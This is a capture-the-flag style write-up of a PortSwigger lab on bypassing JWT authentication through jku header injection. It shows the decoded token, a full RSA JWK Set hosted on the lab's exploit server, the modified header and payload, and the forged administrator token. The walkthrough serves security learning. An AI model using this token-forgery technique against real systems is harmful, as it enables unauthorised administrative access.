## Lab Description :

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/15564523-8805-46d9-a8a1-c018213ec6e6)

## Overview :

Instead of embedding public keys directly using the `jwk` header parameter, some servers let you use the `jku (JWK Set URL)` header parameter to reference a `JWK Set` containing the key. When verifying the signature, the server fetches the relevant key from this URL. 

> **JWK Sets like this are sometimes exposed publicly via a standard endpoint, such as `/.well-known/jwks.json`**.

Secure websites will only fetch keys from trusted domains, but we can sometimes take advantage of URL parsing discrepancies to bypass this kind of filtering. 

## Solution :

Login as wiener using the credentials provided.

These are the followin requests that contain JWT.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/cf2ef19a-5068-407b-8c2e-c139b1b4b669)

Notice that we are unauthorized to view the admin panel.

The request to admin panel has a JWT as follows,

```http
GET /admin HTTP/2
Host: 0a7300b10435c5be803e7bde00d400ec.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: session=eyJraWQiOiJlOGM3OTA0Yy00MzAzLTQ2MDYtYWE3Yy1iMjRkMjUwMTM2NTIiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY5NTcyMjE2N30.H8W4JPBlwfnG0LNE0-ljV59P8dnX5ir83_QUmbxZnh4FlQ3eIFKm7_i6GPys1qE9NCsW-FYDc_KYy_dFYTDwhj_z9k0Cz7u4X_F9b9bCaYJvTE-v7k8SeTv0lBb2e7NeUX4318b9nIRLOHWgw0fcfKP_j6lhXmP-8ZL8TIt2V7w-gzNSyCMc2JAd2zB-9271dPrmcqid02u2uP4HPRC6ziwdlg3tNsubjj5lV-XvtDCScpPQRdrirLaU2UuJ8ZA9NzhZN9d_1fCvVF-UmTaY2l-GQt54hEX7Z5a_xhXHt3rVW_DttBmjzL-DXj5F3PcD5Tg8YPfq2o-Rls_wc6w4IA
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
```
Decode the JWT using [jwt.io](https://jwt.io/)

**Header -**

```json
{
  "kid": "e8c7904c-4303-4606-aa7c-b24d25013652",
  "alg": "RS256"
}
```

**Payload -**

```json
{
  "iss": "portswigger",
  "sub": "wiener",
  "exp": 1695722167
}
```

### Create a new JWK set -

1. Goto `JWT Editor` & create a new RSA key.
```json
{
    "p": "2WfkwJlE57i1CDVdtpyzTMjAPG-vwGxMlLQupdOwGUUWKrgiwKY_xMX7BFdV3-Btune4vefRHH_jLBW1F8I3sZOfJk7k-BZNvC5zawWLaxOfBDr9KvCwRKikI08HOaWzqoe3lZIwxObVb-MGlXU5VHNzcIBYAO6i0z-n3szJWy0",
    "kty": "RSA",
    "q": "xLMj6EargijxOCGawnYcf3J1Be2O26adMyJ98UBgI5CCw3W25uuOsId9QuNaAgWeSBFor_2qsPbTqy9W8ClTLhGWzlqPNdaSw6ia4sVi_6G1CDcz7wsr8-_q3MwrCgJ6W-WZg5F4oL8vXWG-xB0xyRK70ulOhsZteiG1NY3ob3U",
    "d": "HGi8OqgFTZL2AdhJJKkbTjqDwWoVUOhciFxrtEg_-HqZkMBVuQtWajVUNDseu-OxmE89b9hvvuJamS2QNi75qMLzBuA5lfH5WruidaAzJojBgh7Q4ZPuHVENiWfbPDlpiVLbC-mpLZsT3aH6G7FG4dlpyvxgyo3MEeGT2uecSNdO9mvFqBz910LP6p6_VAcfuwdjtIwsi5StdIaa56SNiAPbO1TKkMEHURNvvznFALG5PKe1o6ja83HCMQCcDet_tTxMKx6lT5wM1X3uvS5mHalPQ_SVy3fu9w379hjMk8PuLBiHFMEWuEfoWPNoFhYxDItwJZg8UeqB5i5C3yLWZQ",
    "e": "AQAB",
    "kid": "9ecb48b3-3bd6-4285-8533-4b8277941425",
    "qi": "PHngPE5PRIsRq_IRjPPfBo2X3XuTMiu91wOebsiHEv5HrJ1i-Er2kKbRPqFB-5FrMQmtar1bxAXI5cAyZYszFQ16HG_c6MV0FVYe0OVzkdGWbGPWmeGFSyxMKRRmuGmFMy37XiP4H9n6uMetzO2WomxF6KSt8wQiPCLenPPc7iA",
    "dp": "u_wV1GOzLRqNjpd2fNxqPU6oyplYQu5iGYLjgwfUEUWnsTCe_C3EngUC0_IgkwCgYMf8ulikfBwo9omemPia57VZu-okGlBOzxTrP_L_ZosEyMeo-WQ9RmD77Hv9J1-cRywrFe3etaNTkvefTcSa2ecqPnD7p3Kw4DD-mqxAv9E",
    "dq": "XR0wclSB_CvFhPzjdgrTksFsBFJgvjoxUHOTixEecbeHL2AaJVZ9RbPd6DwX770ZIKSdGjLLCtrNeMwAK9BkP_qzmRvlj2b0MwstxwwJwVmbiTgYraBsPh3k4IEGHsbthXM7KL1EjVPz6BDNbakkWDs2DrHDKqnkSVyLm76BucE",
    "n": "pwutRt51n5LAsFuqpfDf4XKp4lUmLdN2gTsJOIHG-Ye__sHmCv3kRzgXsXp-0fm00CLEsRs8o2Bhd5U6l6FSFrfeXsjtOLRgsLIUEaHEW0BUZ_B_Efljt5uCiMBaIT0Yny4Tzg9bQPpMJSLjh2D64v3xHTm4XxpI0Fx29uLxjrpzhY-W2_IuXVlnNNlcbraBB9Ayq20cfvwQdTQUQY6eluQeCzbi--2pk0nAbnPTR0WG5N14-cUzXTlfl9fvJjvTOBaJ2esqY2b0f1zoM0qYiBoRp4y48Y70MKX9_UBk0yXo-21F42H_zEOZshJked2n9cmqwn7MbqT0iYKiUFcukQ"
}
```
2. Upload the JWK set in a JSON format with the key as `keys` and value in an array as the JWK set.

```json
{
    "keys": [
         {
    "p": "2WfkwJlE57i1CDVdtpyzTMjAPG-vwGxMlLQupdOwGUUWKrgiwKY_xMX7BFdV3-Btune4vefRHH_jLBW1F8I3sZOfJk7k-BZNvC5zawWLaxOfBDr9KvCwRKikI08HOaWzqoe3lZIwxObVb-MGlXU5VHNzcIBYAO6i0z-n3szJWy0",
    "kty": "RSA",
    "q": "xLMj6EargijxOCGawnYcf3J1Be2O26adMyJ98UBgI5CCw3W25uuOsId9QuNaAgWeSBFor_2qsPbTqy9W8ClTLhGWzlqPNdaSw6ia4sVi_6G1CDcz7wsr8-_q3MwrCgJ6W-WZg5F4oL8vXWG-xB0xyRK70ulOhsZteiG1NY3ob3U",
    "d": "HGi8OqgFTZL2AdhJJKkbTjqDwWoVUOhciFxrtEg_-HqZkMBVuQtWajVUNDseu-OxmE89b9hvvuJamS2QNi75qMLzBuA5lfH5WruidaAzJojBgh7Q4ZPuHVENiWfbPDlpiVLbC-mpLZsT3aH6G7FG4dlpyvxgyo3MEeGT2uecSNdO9mvFqBz910LP6p6_VAcfuwdjtIwsi5StdIaa56SNiAPbO1TKkMEHURNvvznFALG5PKe1o6ja83HCMQCcDet_tTxMKx6lT5wM1X3uvS5mHalPQ_SVy3fu9w379hjMk8PuLBiHFMEWuEfoWPNoFhYxDItwJZg8UeqB5i5C3yLWZQ",
    "e": "AQAB",
    "kid": "9ecb48b3-3bd6-4285-8533-4b8277941425",
    "qi": "PHngPE5PRIsRq_IRjPPfBo2X3XuTMiu91wOebsiHEv5HrJ1i-Er2kKbRPqFB-5FrMQmtar1bxAXI5cAyZYszFQ16HG_c6MV0FVYe0OVzkdGWbGPWmeGFSyxMKRRmuGmFMy37XiP4H9n6uMetzO2WomxF6KSt8wQiPCLenPPc7iA",
    "dp": "u_wV1GOzLRqNjpd2fNxqPU6oyplYQu5iGYLjgwfUEUWnsTCe_C3EngUC0_IgkwCgYMf8ulikfBwo9omemPia57VZu-okGlBOzxTrP_L_ZosEyMeo-WQ9RmD77Hv9J1-cRywrFe3etaNTkvefTcSa2ecqPnD7p3Kw4DD-mqxAv9E",
    "dq": "XR0wclSB_CvFhPzjdgrTksFsBFJgvjoxUHOTixEecbeHL2AaJVZ9RbPd6DwX770ZIKSdGjLLCtrNeMwAK9BkP_qzmRvlj2b0MwstxwwJwVmbiTgYraBsPh3k4IEGHsbthXM7KL1EjVPz6BDNbakkWDs2DrHDKqnkSVyLm76BucE",
    "n": "pwutRt51n5LAsFuqpfDf4XKp4lUmLdN2gTsJOIHG-Ye__sHmCv3kRzgXsXp-0fm00CLEsRs8o2Bhd5U6l6FSFrfeXsjtOLRgsLIUEaHEW0BUZ_B_Efljt5uCiMBaIT0Yny4Tzg9bQPpMJSLjh2D64v3xHTm4XxpI0Fx29uLxjrpzhY-W2_IuXVlnNNlcbraBB9Ayq20cfvwQdTQUQY6eluQeCzbi--2pk0nAbnPTR0WG5N14-cUzXTlfl9fvJjvTOBaJ2esqY2b0f1zoM0qYiBoRp4y48Y70MKX9_UBk0yXo-21F42H_zEOZshJked2n9cmqwn7MbqT0iYKiUFcukQ"
}
    ]
}
```
3. Store the JWK set.

### Modify  sign the JWT -

1. Send the */admin* request to repeater.
2. Open the `JSON Web Token` tab & make the following changes
   - Header section :

     1. Replace the current value of the `kid` parameter with the `kid` of the JWK that we just created and uploaded in the exploit server. In my case it is - `9ecb48b3-3bd6-4285-8533-4b8277941425`
           
     2. Add a `JKU` key with the value - `https://exploit-0ac400c304e2c5ec801a7a8801a300b8.exploit-server.net/exploit`.

   - Payload section :
     
           1. Change the value of `"sub": "wiener"` to `"sub": "administrator"`.
3. Now both the header & payload part looks as follows,

**Header -**

```json
{
    "kid": "9ecb48b3-3bd6-4285-8533-4b8277941425",
    "alg": "RS256",
    "jku": "https://exploit-0ac400c304e2c5ec801a7a8801a300b8.exploit-server.net/exploit"
}
```

**Payload -**

```json
{
    "iss": "portswigger",
    "sub": "administrator",
    "exp": 1695722167
}
```
### Self sign the JWTtoken -

Click on **Sign** & enable **Don't modify header** option before clicking OK.

Now the JWT token looks as follows,

```
eyJraWQiOiI5ZWNiNDhiMy0zYmQ2LTQyODUtODUzMy00YjgyNzc5NDE0MjUiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vZXhwbG9pdC0wYWM0MDBjMzA0ZTJjNWVjODAxYTdhODgwMWEzMDBiOC5leHBsb2l0LXNlcnZlci5uZXQvZXhwbG9pdCJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2OTU3MjIxNjd9.NDFj4ZHPnpa-to4ygZhtncMVOhqH8SxGPPYiFzTG8JKew2fM3QDJipS_GF1TD3E6og2J-eGEH2C2P0o9IOj64dRZNOWAtzFBNrdYfJriv9bolx3klWxOyWD3eoUoUqPR_7DMCxA6ZHs5ODywsKhv1x8aqG1svnqup6zrSJ47_jD5GLemkG4Fff27frKxB1uIx0bOiRCMOLLIkL6TZPHBhfgrSdZXwwWx8kgAGF_vRFc6KJHf2cq3ygXv-5yqwXR6dpgTgUbRYbvqLnUrhQRLa5yJkfF3_40m-3JGWy2fQ0mHOrd6k_W2IP8QMs3fVjnISLBdo3z7YAbSb9-SN6fxfQ
```

Replace the original JWT with the one we just created & forward the request to /admin.

Now we are able to access the administrator tab.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/b80c8da2-3edc-48eb-9581-6523ff5b043e)

Delete the user carlos to solve the lab.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/2c68f283-acbb-4511-bfd5-3d424ac6928f)

   
